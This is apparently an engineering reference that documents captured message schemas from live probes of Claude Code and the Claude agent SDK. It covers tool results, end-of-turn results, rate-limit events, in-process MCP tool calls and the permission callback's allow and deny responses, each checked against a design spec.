{"type": "user", "message": {"role": "user", "content": [{"type": "tool_result", "content": "handler exploded on purpose", "is_error": true, "tool_use_id": "toolu_01RYM214S5Pymkp8hiN7UKVw"}]}, "parent_tool_use_id": null, "session_id": "15014424-acaa-4260-976f-1c7d410304c9", "uuid": "f2d35dec-e5b0-42a7-95b3-da228c79e6de", "timestamp": "2026-09-14T16:05:30.469Z", "tool_use_result": "Error: handler exploded on purpose"}
{"type": "user", "message": {"role": "user", "content": [{"type": "tool_result", "content": "Input validation error: 'task' is a required property", "is_error": true, "tool_use_id": "toolu_019wiReaC5V2GxjuEChfoGmC"}]}, "parent_tool_use_id": null, "session_id": "15014424-acaa-4260-976f-1c7d410304c9", "uuid": "70dd4cde-0408-4e59-b82d-b502d06e858b", "timestamp": "2026-09-14T16:05:31.603Z", "tool_use_result": "Error: Input validation error: 'task' is a required property"}
{"type": "user", "message": {"role": "user", "content": [{"type": "tool_result", "content": "you declined this", "is_error": true, "tool_use_id": "toolu_01Pr6kGMH2yKsGGgfJggVXFM"}]}, "parent_tool_use_id": null, "session_id": "29135891-805b-46d1-8b1a-a9281447720f", "uuid": "08d8d444-18ad-4444-b13d-427c98124c47", "timestamp": "2026-09-14T16:09:34.002Z", "tool_use_result": "Error: you declined this", "tool_result_meta": [{"id": "toolu_01Pr6kGMH2yKsGGgfJggVXFM", "non_execution_kind": "permission-rule"}]}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `message.content[].type` | str | always | `tool_result`, `text` | `text` only for interrupt notices |
| `message.content[].content` | list[{type,text}] **or** str | always | list on success; bare str on error | shape differs by outcome |
| `message.content[].is_error` | bool | 18/34 | `true`; `false` on Bash | absent on MCP successes |
| `tool_use_result` | list \| str \| dict | 34/36 | `"Error: <text>"` on errors; Bash gives `{stdout,stderr,interrupted,isImage,noOutputExpected}` | |
| `tool_result_meta[].non_execution_kind` | str | 3/36 | `permission-rule` (deny), `user-rejected` (interrupt during approval) | distinguishes "not run" from "ran and failed" |

**Variants and edge cases:** the interrupt variants (`[Request interrupted by user]`, `[Request interrupted by user for tool use]`) are in the interrupt schema.

**Spec alignment:** aligned with line 1722 (errors come back as readable `is_error` tool results) and with line 1743 (the deny message reaches the model verbatim: `"content": "you declined this"`).

---

### `ResultMessage` (end of turn)

- **Produced by:** Claude Code 2.1.259/2.1.270 `type:"result"` → claude-agent-sdk 0.2.152 `ResultMessage`
- **Consumed by:** §6 `MasterCapabilities` (billing_mode, context_window), D31 wake set (error outcomes), §12 Chat; D30; M4
- **Probe:** `master_probe.py basic`, `interrupt`, `interrupt_pending_approval`. Re-run: as above
- **Status:** partially verified (live 2026-09-14: 19 results, 17 `success`, 2 `error_during_execution`. The subtypes `error_max_turns`, `error_max_budget_usd`, API-error results with `api_error_status` set, and `structured_output` were not provoked, so their shapes are not verified)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/basic/raw-stream.jsonl`)

```json
{"duration_api_ms": 30789, "stop_reason": "end_turn", "session_id": "38678603-2eef-404b-9504-d92993fb025f", "total_cost_usd": 0.05933240000000001, "usage": {"input_tokens": 81, "cache_creation_input_tokens": 16800, "cache_read_input_tokens": 120664, "output_tokens": 2497, "...": "...", "service_tier": "standard", "...": "..."}, "modelUsage": {"claude-haiku-4-5-20251001": {"inputTokens": 1121, "outputTokens": 2509, "cacheReadInputTokens": 120664, "cacheCreationInputTokens": 16800, "webSearchRequests": 0, "costUSD": 0.05933240000000001, "contextWindow": 200000, "maxOutputTokens": 32000, "thinkingTokens": 1895, "canonicalModel": "claude-haiku-4-5", "provider": "firstParty", "costBasis": "list"}}, "permission_denials": [], "terminal_reason": "completed", "fast_mode_state": "off", "fast_mode_disabled_reason": "sdk_opt_in_required", "subagent_stats": {"spawned": 0, "...": "...", "max_depth": 0, "...": "..."}, "is_error": false, "num_turns": 9, "subtype": "success", "api_error_status": null, "result": "DONE", "ttft_ms": 5932, "type": "result", "duration_ms": 30276, "uuid": "e6a97abf-2153-4e31-a024-4ff58461c270", "ttft_stream_ms": 636, "time_to_request_ms": 66, "queued_turn_count": 0}
```

Interrupted turns (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/interrupt/raw-stream.jsonl`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/interrupt_pending_approval/raw-stream.jsonl`):

```json
{"duration_api_ms": 751, "stop_reason": null, "session_id": "6438769d-8836-42e2-a469-8b84200d0660", "total_cost_usd": 0.000988, "...": "...", "permission_denials": [], "terminal_reason": "aborted_streaming", "...": "...", "is_error": true, "num_turns": 2, "subtype": "error_during_execution", "errors": ["[ede_diagnostic] result_type=user last_content_type=n/a stop_reason=null"], "type": "result", "duration_ms": 7121, "uuid": "7ec13d9a-5153-45a0-b188-0d6615f93b20", "queued_turn_count": 0}
{"duration_api_ms": 2255, "stop_reason": "tool_use", "session_id": "920f6ed2-84e6-4a36-97e6-470322ac539b", "total_cost_usd": 0.0029430000000000003, "...": "...", "permission_denials": [{"tool_name": "mcp__shepherd__kill_session", "tool_use_id": "toolu_013kVAXAVbKLKYf9S3ZtMd8F", "tool_input": {"id": "ses_slow"}}], "terminal_reason": "aborted_tools", "...": "...", "is_error": true, "num_turns": 3, "subtype": "error_during_execution", "errors": ["[ede_diagnostic] result_type=user last_content_type=n/a stop_reason=tool_use"], "type": "result", "duration_ms": 7933, "uuid": "2c46ad1e-cfe7-470a-92c9-681d35fcb263", "queued_turn_count": 0}
```

What the SDK parser keeps (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/messages.jsonl`):

```json
{"_ts": "2026-09-14T16:05:34.233Z", "_label": "turn1", "_class": "ResultMessage", "fields": {"subtype": "success", "duration_ms": 10746, "duration_api_ms": 11614, "is_error": false, "num_turns": 7, "session_id": "15014424-acaa-4260-976f-1c7d410304c9", "stop_reason": "end_turn", "total_cost_usd": 0.020229, "usage": {"input_tokens": 14699, "cache_creation_input_tokens": 0, "cache_read_input_tokens": 0, "output_tokens": 886, "output_tokens_details": {"thinking_tokens": 427}, "server_tool_use": {"web_search_requests": 0, "web_fetch_requests": 0}, "service_tier": "standard", "cache_creation": {"ephemeral_1h_input_tokens": 0, "ephemeral_5m_input_tokens": 0}, "inference_geo": "not_available", "iter...
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `subtype` | str | always | `success`, `error_during_execution` | |
| `is_error` | bool | always | `false`, `true` | `true` for interrupts |
| `terminal_reason` | str | always | `completed`, `aborted_streaming`, `aborted_tools` | the reliable "why it ended" |
| `stop_reason` | str \| null | always | `end_turn`, `tool_use`, `null` | |
| `session_id` | str | always | | same as `system/init.session_id` |
| `num_turns` | int | always | 1–9 | counts model calls, not user turns |
| `duration_ms` / `duration_api_ms` | int | always | | |
| `total_cost_usd` | float | always | 0.000988–0.0593 | **list-price estimate even on a seat** |
| `usage` | dict | always | `input_tokens`, `cache_*`, `output_tokens`, `output_tokens_details.thinking_tokens`, `iterations[]`, … | |
| `modelUsage.<model>` | dict | always | `contextWindow: 200000`, `maxOutputTokens: 32000`, `costUSD`, `costBasis: "list"`, `provider: "firstParty"` | → `ModelUsage` in the SDK |
| `permission_denials[]` | list[{tool_name, tool_use_id, tool_input}] | always | `[]`; one entry on deny and on interrupt-during-approval | |
| `errors` | list[str] | on `error_during_execution` | `"[ede_diagnostic] result_type=user last_content_type=n/a stop_reason=null"` | |
| `result` | str | on `success` | final text | |
| `api_error_status` | int \| null | on `success` | `null` | |
| `subagent_stats`, `ttft_ms`, `ttft_stream_ms`, `time_to_request_ms`, `queued_turn_count`, `fast_mode_*`, `uuid` | | always / on success | | `subagent_stats`, `ttft_*`, `time_to_request_ms`, `queued_turn_count`, `fast_mode_*` are dropped by the SDK parser |

**Variants and edge cases:**
- The billing evidence for D30 is in the handshake response and in `modelUsage` (full captures: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/basic/raw-stream.jsonl`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/auth-context.txt`):

```json
{"type": "control_response", "response": {"...": "...", "response": {"...": "...", "account": {"email": "<redacted>", "organization": "<redacted>", "subscriptionType": "Claude Max", "apiProvider": "firstParty"}, "...": "..."}}}
{"...": "...", "total_cost_usd": 0.05933240000000001, "...": "...", "modelUsage": {"claude-haiku-4-5-20251001": {"inputTokens": 1121, "outputTokens": 2509, "cacheReadInputTokens": 120664, "cacheCreationInputTokens": 16800, "webSearchRequests": 0, "costUSD": 0.05933240000000001, "contextWindow": 200000, "maxOutputTokens": 32000, "thinkingTokens": 1895, "canonicalModel": "claude-haiku-4-5", "provider": "firstParty", "costBasis": "list"}}, "...": "..."}
```

```text
date: 2026-09-14T16:15:25Z
PATH claude --version: 2.1.270 (Claude Code)
~/.claude/.credentials.json exists: yes
ANTHROPIC_* env names in the calling shell: 
(master_probe.py additionally deletes every CLAUDE*/ANTHROPIC*/AI_AGENT var before spawning the CLI)
```

**Spec alignment:**
- D30 (line 133) and spec line 1556 say "picks up local Claude Code credentials: the user's subscription". That is aligned: no API key in the environment, `apiKeySource: "none"`, `subscriptionType: "Claude Max"`, and every turn succeeded. `total_cost_usd`/`costUSD` are still non-zero with `costBasis: "list"`, so a UI that shows them for `billing_mode="seat"` would show a notional cost.
- Spec line 521 `MasterCapabilities.context_window: int` can be sourced from `modelUsage.<model>.contextWindow` (200000 observed), but only after the first turn. `supports_parallel_tool_calls` (line 520) was not observed: the model always made one call per step.

---

### Other stream objects: `rate_limit_event`, `system/status`, `system/thinking_tokens`, `stream_event`

- **Produced by:** Claude Code 2.1.259
- **Consumed by:** §6 `send()` event stream; §17 "plan-window pacing" (deferred); M4
- **Probe:** `master_probe.py resume` and `interrupt` (`include_partial_messages=True`). Re-run: as above
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/resume/raw-stream.jsonl`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/interrupt/raw-stream.jsonl`)

```json
{"type": "rate_limit_event", "rate_limit_info": {"status": "allowed", "resetsAt": 1789414800, "rateLimitType": "five_hour", "overageStatus": "rejected", "overageDisabledReason": "org_level_disabled", "isUsingOverage": false, "unifiedWindows": {"five_hour": {"utilization": 0.31, "resetsAt": 1789414800}, "seven_day": {"utilization": 0.07, "resetsAt": 1789934400}}}, "uuid": "ea0afbd7-e7ea-4e4f-9d9a-e6dada520b6a", "session_id": "e6fed1a4-c0b1-41d6-be36-b445e606c5a1"}
{"type": "system", "subtype": "status", "status": "requesting", "session_id": "6438769d-8836-42e2-a469-8b84200d0660", "uuid": "3732a84f-5e62-45db-b0d2-7136dbec491f"}
{"type": "system", "subtype": "thinking_tokens", "estimated_tokens": 50, "estimated_tokens_delta": 50, "session_id": "6438769d-8836-42e2-a469-8b84200d0660", "uuid": "bebaace1-bebe-4b01-ba3c-b45ac9cfa728"}
{"type": "stream_event", "event": {"type": "content_block_delta", "index": 0, "delta": {"type": "thinking_delta", "thinking": "", "estimated_tokens": 50}}, "session_id": "6438769d-8836-42e2-a469-8b84200d0660", "parent_tool_use_id": null, "uuid": "8e4a6c7b-21a1-4892-9870-097bebb90562"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `rate_limit_info.status` | str | always | `allowed` | SDK literal also has `allowed_warning`, `rejected` |
| `rate_limit_info.rateLimitType` | str | always | `five_hour` | |
| `rate_limit_info.unifiedWindows.{five_hour,seven_day}.utilization` | float | always | 0.31–0.33, 0.07 | seat plan-window usage |
| `rate_limit_info.resetsAt`, `overageStatus`, `overageDisabledReason`, `isUsingOverage` | | always | `rejected`, `org_level_disabled`, `false` | |
| `system/status.status` | str | 2 seen | `requesting` | only seen with `include_partial_messages=True` |
| `system/thinking_tokens.estimated_tokens(_delta)` | int | 65 seen | | |
| `stream_event.event.type` | str | 35 seen | `message_start`, `content_block_start`, `content_block_delta`, `content_block_stop`, `message_delta`, `message_stop` | raw Messages-API stream events; requires `include_partial_messages=True` |

**Variants and edge cases:** `RateLimitEvent` is parsed by the SDK. `system/status` and `system/thinking_tokens` arrive as a generic `SystemMessage(subtype, data)`.

**Spec alignment:** the spec does not reference these, so there is nothing to align. `rate_limit_event` is the seat-side input any future pacing (§17) would need.

---

### In-process MCP tool declaration (`@tool` + `create_sdk_mcp_server`) and the wire shape it produces

- **Produced by:** claude-agent-sdk 0.2.152 (`__init__.py:251`, `:491`); served to Claude Code 2.1.259 over the control protocol
- **Consumed by:** §11.0 exporter `to_sdk_mcp_server()` (line 1479), `ToolDef.input_schema` (line 1455), §11 Master configuration (line 1532); D32; M4
- **Probe:** `docs/probes/2026-09-14-schemas/agent-sdk-mcp/introspect_sdk.py` (source) and `master_probe.py locked` (wire). Re-run: as above
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/mcp-server-source.txt` and `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`)

```text
def tool(
    name: str,
    description: str,
    input_schema: type | dict[str, Any],
    annotations: _McpToolAnnotations | None = None,
) -> Callable[[Callable[[Any], Awaitable[dict[str, Any]]]], SdkMcpTool[Any]]:
...
def create_sdk_mcp_server(
    name: str, version: str = "1.0.0", tools: list[SdkMcpTool[Any]] | None = None
) -> McpSdkServerConfig:
...
        >>> config = McpSdkServerConfig(type="sdk", name="mine", instance=my_server)
...
                jsonschema.validate(instance=arguments, schema=schemas[tool_name])
...
                return _tool_error_result(f"Input validation error: {e.message}")
...
                    "isError": result.get("is_error", False),
...
        except Exception as e:
            return _tool_error_result(str(e))
...
    return McpSdkServerConfig(type="sdk", name=name, instance=server)
...
    annotations: _McpToolAnnotations | None = None
```

The MCP `initialize` and `tools/list` exchange for the in-process server. It is tunnelled through the CLI as `control_request{subtype:"mcp_message"}`, and the SDK answers with `control_response{mcp_response}`:

```json
{"type": "control_request", "request_id": "b01c57e3-ec06-4af7-96a4-8d182e7bf7ed", "request": {"subtype": "mcp_message", "server_name": "shepherd", "message": {"method": "initialize", "params": {"protocolVersion": "2025-11-25", "capabilities": {}, "clientInfo": {"name": "claude-code", "title": "Claude Code", "version": "2.1.259", "description": "Anthropic's agentic coding tool", "websiteUrl": "https://claude.com/claude-code"}}, "jsonrpc": "2.0", "id": 0}}}
{"type": "control_response", "response": {"subtype": "success", "request_id": "b01c57e3-ec06-4af7-96a4-8d182e7bf7ed", "response": {"mcp_response": {"jsonrpc": "2.0", "id": 0, "result": {"capabilities": {"experimental": {}, "tools": {"listChanged": false}}, "protocolVersion": "2025-11-25", "serverInfo": {"name": "shepherd", "version": "1.0.0"}}}}}}
{"type": "control_request", "request_id": "ca720a2f-f404-4391-8c4f-153cdb2db690", "request": {"subtype": "mcp_message", "server_name": "shepherd", "message": {"method": "tools/list", "jsonrpc": "2.0", "id": 1}}}
{"type": "control_response", "response": {"subtype": "success", "request_id": "ca720a2f-f404-4391-8c4f-153cdb2db690", "response": {"mcp_response": {"jsonrpc": "2.0", "id": 1, "result": {"tools": [{"description": "Return counts of sessions by bucket. Takes no arguments.", "inputSchema": {"properties": {}, "type": "object"}, "name": "fleet_summary"}, {"description": "Spawn a session in a project with a task.", "inputSchema": {"properties": {"project_id": {"type": "string"}, "task": {"type": "string"}, "model": {"type": ["string", "null"]}}, "required": ["project_id", "task"], "type": "object"}, "name": "spawn_session"}, {"description": "Kill a session by id.", "inputSchema": {"properties": {"id": {"type": "string"}}, "required": ["id"], "type": "object"}, "name": "kill_session"}, {"description": "A tool that always reports an error result.", "inputSchema": {"properties": {"reason": {"type": "string"}}, "required": ["reason"], "type": "object"}, "name": "fail_tool"}, {"description": "A tool whose handler raises an exception.", "inputSchema": {"properties": {}, "type": "object"}, "name": "raise_tool"}]}}}}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `@tool(name, description, input_schema, annotations=None)` | decorator → `SdkMcpTool` | — | | handler must be `async def h(args: dict) -> dict` |
| `input_schema` given as JSON Schema | dict with str `type` **and** `properties` | — | `{"type":"object","properties":{}}` | passed through unchanged (key order re-sorted by pydantic on the wire) |
| `input_schema` given as `{name: pytype}` | dict | — | `{"id": str}` → `{"properties":{"id":{"type":"string"}},"required":["id"],"type":"object"}` | every key becomes required |
| `request.server_name` | str | always | `shepherd` | the `mcp_servers` dict key |
| `message.params.clientInfo.version` | str | always | `2.1.259` | |
| `message.params.protocolVersion` | str | always | `2025-11-25` | |
| `result.tools[].name` | str | always | bare `kill_session` | the model sees `mcp__shepherd__kill_session` (`system/init.tools`, `tool_use.name`) |
| `result.tools[].annotations`, `_meta` | | never (none declared) | | `ToolAnnotations(maxResultSizeChars=N)` → `_meta["anthropic/maxResultSizeChars"]` (`internals-source.txt`, `_build_meta`) |

**Variants and edge cases:**
- The dict-vs-JSON-Schema test is purely structural (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/internals-source.txt`, `_build_input_schema`). A JSON Schema **without** `"properties"`, such as `{"type":"object"}`, is treated as a `{name: type}` map, producing `properties: {"type": ...}` (read from source; not provoked live). The exporter must always emit `properties`.
- The server object is a real `mcp.server.Server`, but its traffic crosses the CLI's stdio pipe, so it is "in-process" only on the Python side.

**Spec alignment:**
- Spec line 1455 says `input_schema: dict  # plain JSON Schema`. That is aligned, provided the exporter always includes `type` and `properties` (see above).
- Spec line 1530 says `f"mcp__shepherd__{t}"`. That is aligned: `name` in the model's tool list and in `tool_use` is `mcp__<server key>__<tool name>`.
- Spec line 1694 describes `to_sdk_mcp_server()` as "in-process". That is aligned for the handler; the JSON-RPC still round-trips through the CLI subprocess.

---

### In-process MCP `tools/call`: what the handler receives, returns, and how errors look

- **Produced by:** Claude Code 2.1.259 (`tools/call`) / claude-agent-sdk 0.2.152 `run_tool` (result)
- **Consumed by:** §11.0 `invoke()` (line 1464) inside `to_sdk_mcp_server()`, recursion-cap errors (line 1722); D32; M4
- **Probe:** `master_probe.py locked`. Re-run: as above
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`). The four pairs are: success, `is_error` returned, handler raised, and argument missing a required property.

```json
{"type": "control_request", "request_id": "9ac59657-09da-4203-b9e6-31a2dd1050f5", "request": {"subtype": "mcp_message", "server_name": "shepherd", "message": {"method": "tools/call", "params": {"name": "kill_session", "arguments": {"id": "ses_a1"}, "_meta": {"claudecode/toolUseId": "toolu_01VcYQNKad4ejYQGSP4eZ3ov", "progressToken": 4}}, "jsonrpc": "2.0", "id": 4}}}
{"type": "control_response", "response": {"subtype": "success", "request_id": "9ac59657-09da-4203-b9e6-31a2dd1050f5", "response": {"mcp_response": {"jsonrpc": "2.0", "id": 4, "result": {"content": [{"text": "killed ses_a1", "type": "text"}], "isError": false}}}}}
{"type": "control_request", "request_id": "23d45692-70a7-4c45-a0a8-717a7db770f0", "request": {"subtype": "mcp_message", "server_name": "shepherd", "message": {"method": "tools/call", "params": {"name": "fail_tool", "arguments": {"reason": "probe"}, "_meta": {"claudecode/toolUseId": "toolu_012FdXhQgMDRg25WPkfmz7iw", "progressToken": 5}}, "jsonrpc": "2.0", "id": 5}}}
{"type": "control_response", "response": {"subtype": "success", "request_id": "23d45692-70a7-4c45-a0a8-717a7db770f0", "response": {"mcp_response": {"jsonrpc": "2.0", "id": 5, "result": {"content": [{"text": "max_children_per_session=5 reached", "type": "text"}], "isError": true}}}}}
{"type": "control_request", "request_id": "a8aa4e0c-42a1-4bee-9006-a5e81f5fa7d5", "request": {"subtype": "mcp_message", "server_name": "shepherd", "message": {"method": "tools/call", "params": {"name": "raise_tool", "arguments": {}, "_meta": {"claudecode/toolUseId": "toolu_01RYM214S5Pymkp8hiN7UKVw", "progressToken": 6}}, "jsonrpc": "2.0", "id": 6}}}
{"type": "control_response", "response": {"subtype": "success", "request_id": "a8aa4e0c-42a1-4bee-9006-a5e81f5fa7d5", "response": {"mcp_response": {"jsonrpc": "2.0", "id": 6, "result": {"content": [{"text": "handler exploded on purpose", "type": "text"}], "isError": true}}}}}
{"type": "control_request", "request_id": "a3d2b8cb-d8ec-4dda-a2a6-406f58c46138", "request": {"subtype": "mcp_message", "server_name": "shepherd", "message": {"method": "tools/call", "params": {"name": "spawn_session", "arguments": {"project_id": "p2"}, "_meta": {"claudecode/toolUseId": "toolu_019wiReaC5V2GxjuEChfoGmC", "progressToken": 7}}, "jsonrpc": "2.0", "id": 7}}}
{"type": "control_response", "response": {"subtype": "success", "request_id": "a3d2b8cb-d8ec-4dda-a2a6-406f58c46138", "response": {"mcp_response": {"jsonrpc": "2.0", "id": 7, "result": {"content": [{"text": "Input validation error: 'task' is a required property", "type": "text"}], "isError": true}}}}}
```

What the Python handler actually received and returned (full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/handler-calls.jsonl`):

```json
{"_ts": "2026-09-14T16:05:25.616Z", "tool": "fleet_summary", "received": {}, "returned": {"content": [{"type": "text", "text": "{\"running\": 2, \"needs_you\": [\"ses_a1\"], \"stopped\": 1}"}]}}
{"_ts": "2026-09-14T16:05:26.878Z", "tool": "spawn_session", "received": {"project_id": "p1", "task": "write tests"}, "returned": {"content": [{"type": "text", "text": "ses_new42"}]}}
{"_ts": "2026-09-14T16:05:28.016Z", "tool": "kill_session", "received": {"id": "ses_a1"}, "returned": {"content": [{"type": "text", "text": "killed ses_a1"}]}}
{"_ts": "2026-09-14T16:05:29.019Z", "tool": "fail_tool", "received": {"reason": "probe"}, "returned": {"content": [{"type": "text", "text": "max_children_per_session=5 reached"}], "is_error": true}}
{"_ts": "2026-09-14T16:05:30.461Z", "tool": "raise_tool", "received": {}, "returned": "RAISES RuntimeError"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| handler argument | dict | always | `{}`, `{"project_id":"p1","task":"write tests"}` | exactly `params.arguments`; no context, no tool_use_id |
| `params._meta.claudecode/toolUseId` | str | always | `toolu_…` | only on the wire. **The handler does not get it** |
| `params._meta.progressToken` | int | always | 2–7 | |
| handler return `content[]` | list[{type:"text",text}\|{type:"image",data,mimeType}\|resource_link\|resource] | always | text | unknown block types are dropped with a warning (`internals-source.txt`, `_convert_tool_content`) |
| handler return `is_error` | bool | sometimes | `true` | → wire `isError` |
| wire `result.isError` | bool | always | `false`, `true` | the SDK always sets it |
| handler exception | — | — | `RuntimeError("handler exploded on purpose")` | → `isError:true`, text = `str(exc)`. **Never a JSON-RPC error** |
| schema violation | — | — | `Input validation error: 'task' is a required property` | the SDK validates with `jsonschema` **before** calling the handler; the CLI sent the invalid call unvalidated |

**Variants and edge cases:** an unknown tool name becomes `isError` `"Tool '<name>' not found"` (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/mcp-server-source.txt`; not provoked live).

**Spec alignment:**
- Spec lines 1464–1472 (`invoke()` returning `ToolResult.denied(reason)`) are aligned in shape: a denial or cap has to become `{"content":[{"type":"text","text":reason}],"is_error":True}`, and the model reads it (see `UserMessage`).
- Spec §11.0 `CallerContext` is silent on caller identity for the master binding. In reality the SDK handler receives only `arguments`; the `toolUseId` stays in `_meta`, which `create_sdk_mcp_server` does not pass on. Any per-call context (audit correlation to `tool_use_id`) needs a PreToolUse hook or a custom `mcp.server.Server` (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`, `handler-calls.jsonl`).

---

### `can_use_tool` permission callback (control request, callback input, allow and deny)

- **Produced by:** Claude Code 2.1.259/2.1.270 (`control_request{subtype:"can_use_tool"}`) / claude-agent-sdk 0.2.152 (`ToolPermissionContext`, `PermissionResultAllow|Deny`)
- **Consumed by:** §11 Master configuration `can_use_tool=authorize` (line 1534), §11 `authorize()` (lines 1725–1751); D8, D10; M4
- **Probe:** `master_probe.py locked`, `deny`, `slow_approval`. Re-run: as above
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/deny/raw-stream.jsonl`). The four lines are: request, allow response, request, deny response.

```json
{"type": "control_request", "request_id": "15010c03-fdae-4d46-91e5-7625b8c75f43", "request": {"subtype": "can_use_tool", "tool_name": "mcp__shepherd__kill_session", "display_name": "Kill Session", "input": {"id": "ses_a1"}, "permission_suggestions": [{"type": "addRules", "rules": [{"toolName": "mcp__shepherd__kill_session"}], "behavior": "allow", "destination": "localSettings"}], "tool_use_id": "toolu_01VcYQNKad4ejYQGSP4eZ3ov"}}
{"type": "control_response", "response": {"subtype": "success", "request_id": "15010c03-fdae-4d46-91e5-7625b8c75f43", "response": {"behavior": "allow", "updatedInput": {"id": "ses_a1"}}}}
{"type": "control_request", "request_id": "24d91a79-57b6-457a-a76a-c39575ae194e", "request": {"subtype": "can_use_tool", "tool_name": "mcp__shepherd__kill_session", "display_name": "Kill Session", "input": {"id": "ses_x"}, "permission_suggestions": [{"type": "addRules", "rules": [{"toolName": "mcp__shepherd__kill_session"}], "behavior": "allow", "destination": "localSettings"}], "tool_use_id": "toolu_01Pr6kGMH2yKsGGgfJggVXFM"}}
{"type": "control_response", "response": {"subtype": "success", "request_id": "24d91a79-57b6-457a-a76a-c39575ae194e", "response": {"behavior": "deny", "message": "you declined this"}}}
```

What the Python callback received (full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/can-use-tool.jsonl`):

```json
{"_ts": "2026-09-14T16:05:28.001Z", "tool_name": "mcp__shepherd__kill_session", "tool_input": {"id": "ses_a1"}, "context": {"signal": null, "suggestions": [{"type": "addRules", "rules": [{"tool_name": "mcp__shepherd__kill_session", "rule_content": null}], "behavior": "allow", "mode": null, "directories": null, "destination": "localSettings"}], "tool_use_id": "toolu_01VcYQNKad4ejYQGSP4eZ3ov", "agent_id": null, "blocked_path": null, "decision_reason": null, "title": null, "display_name": "Kill Session", "description": null}, "returned": {"behavior": "allow", "updated_input": {"id": "ses_a1"}}}
```

A callback that blocks for 75 s (full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/slow_approval/can-use-tool.jsonl`, `meta.json`):

```text
{"_ts": "2026-09-14T16:07:18.944Z", "phase": "entered", "tool_name": "mcp__shepherd__kill_session", "tool_input": {"id": "ses_slow"}}
{"_ts": "2026-09-14T16:08:34.014Z", "phase": "returning allow after sleep", "slept_s": 75}
  "turn_wall_s": 77.29,
  "status": "ok",
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `request.tool_name` | str | always | `mcp__shepherd__kill_session` | prefixed name, not the `ToolDef.name` |
| `request.input` | dict | always | `{"id":"ses_a1"}` | → callback arg 2 |
| `request.display_name` | str | always | `Kill Session` | derived from the tool name |
| `request.permission_suggestions[]` | list | always | `addRules` → `localSettings` | → `context.suggestions` |
| `request.tool_use_id` | str | always | | → `context.tool_use_id` |
| `context.blocked_path`, `decision_reason`, `agent_id`, `title`, `description`, `signal` | | always (null) | `null` | |
| response `behavior` | str | always | `allow`, `deny` | |
| response `updatedInput` | dict | on allow | echo of input | the SDK renames `updated_input` → `updatedInput` |
| response `message` | str | on deny | `you declined this` | reaches the model as `tool_result.content`, `is_error:true` |
| `PermissionResultDeny.interrupt` | bool | never sent | `False` | exists in 0.2.152 (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/message-types.txt`) |

**Variants and edge cases:**
- **Blocking works**: the CLI waited 75 s for the callback and then ran the tool (`slow_approval`). A 600 s wait (spec line 1738) was not attempted.
- `interrupt()` while the callback is pending: the CLI sends `control_cancel_request` and the SDK **cancels the callback task** (`CancelledError`). See the interrupt schema.
- The callback is not consulted for `allowed_tools` entries, nor for tool calls Claude Code considers safe on its own (read-only Bash, next schema).

**Spec alignment:**
- Spec line 1534 vs line 1728: the signature does not match (see `ClaudeAgentOptions` above). The callback gets the prefixed MCP name and a raw dict, and must map them back to a `ToolDef` itself.
- Spec line 1747 says "The callback blocks the agent's turn while an approval is pending". That is aligned: 75 s observed. Spec line 1744's "approval timed out" deny is the callback's own job; no CLI-side timeout fired within 75 s.

---

### Built-in tools reachable from the spec-configured master

- **Produced by:** Claude Code 2.1.259 under the §11 option block
- **Consumed by:** §11 "The master still has no Read, Write, Edit, Bash, or WebFetch" (line 1542), D10, D19 isolation test (line 2193); M4
- **Probe:** `master_probe.py basic` vs `tools_empty` vs `locked`. Re-run: as above
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/basic/raw-stream.jsonl`)

```json
{"type": "assistant", "message": {"...": "...", "content": [{"type": "tool_use", "id": "toolu_0143BWgWYJE8531p4aCq84rp", "name": "Bash", "input": {"command": "echo hi"}, "caller": {"type": "direct"}}], "...": "..."}, "...": "..."}
{"type": "control_request", "request_id": "9206de57-5623-4705-b1c8-e92a8d53f981", "request": {"subtype": "hook_callback", "callback_id": "hook_0", "input": {"session_id": "38678603-2eef-404b-9504-d92993fb025f", "transcript_path": "/root/.claude/projects/-tmp-shp-sdk-9IOKNs-work-basic/38678603-2eef-404b-9504-d92993fb025f.jsonl", "cwd": "/tmp/shp-sdk-9IOKNs/work-basic", "prompt_id": "c6200a3f-0b7d-4d62-aa8a-1734e9bd1598", "permission_mode": "default", "hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "echo hi"}, "tool_use_id": "toolu_0143BWgWYJE8531p4aCq84rp"}, "tool_use_id": "toolu_0143BWgWYJE8531p4aCq84rp"}}
